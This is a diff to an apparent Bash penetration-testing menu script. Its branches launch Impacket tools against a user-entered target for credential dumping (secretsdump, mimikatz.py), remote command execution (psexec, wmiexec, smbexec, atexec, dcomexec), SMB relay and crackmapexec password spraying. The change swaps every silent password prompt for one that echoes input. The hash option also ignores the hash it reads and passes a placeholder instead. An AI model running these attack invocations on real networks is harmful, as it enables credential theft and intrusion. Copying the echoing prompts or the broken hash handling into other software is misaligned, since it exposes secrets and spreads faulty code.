@@ -2010,77 +2010,77 @@ run_impacket() {
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/secretsdump.py $domain/$username:$password@$target_ip
             ;;
         4)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/smbclient.py $domain/$username:$password@$target_ip
             ;;
 	5)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter hash: " hash
+            read -e -p "Enter hash: " hash
             python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $domain/$username@$target_ip -hashes lmhash:nthash
             ;;
 	6)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $domain/$username:$password@$target_ip
             ;;
         7)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/psexec.py $domain/$username:$password@$target_ip
             ;;
         8)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/dcerpcdump.py $domain/$username:$password@$target_ip
             ;;
         9)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/mimikatz.py $domain/$username:$password@$target_ip
             ;;
         10)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/dcomexec.py $domain/$username:$password@$target_ip
             ;;
         11)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/atexec.py $domain/$username:$password@$target_ip
             ;;
 	12)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/smbexec.py $domain/$username:$password@$target_ip
             ;;
         13)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/rdpclient.py $domain/$username:$password@$target_ip
             ;;
         14)
@@ -2124,7 +2124,7 @@ run_impacket() {
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            read -s -p "Enter password: " password
+            read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/smbrelayx.py -h $domain/$username:$password@$target_ip
             ;;
         *)
@@ -2173,7 +2173,7 @@ password_spraying() {
     read -e -p "Enter target IP: " target_ip
     read -e -p "Enter domain: " domain
     read -e -p "Enter username list file: " user_list
-    read -s -p "Enter password: " password
+    read -e -p "Enter password: " password
     echo -e "\n${BLUE}[+] Running Password Spraying...${NC}"
     crackmapexec smb $target_ip -u $user_list -p $password
 }
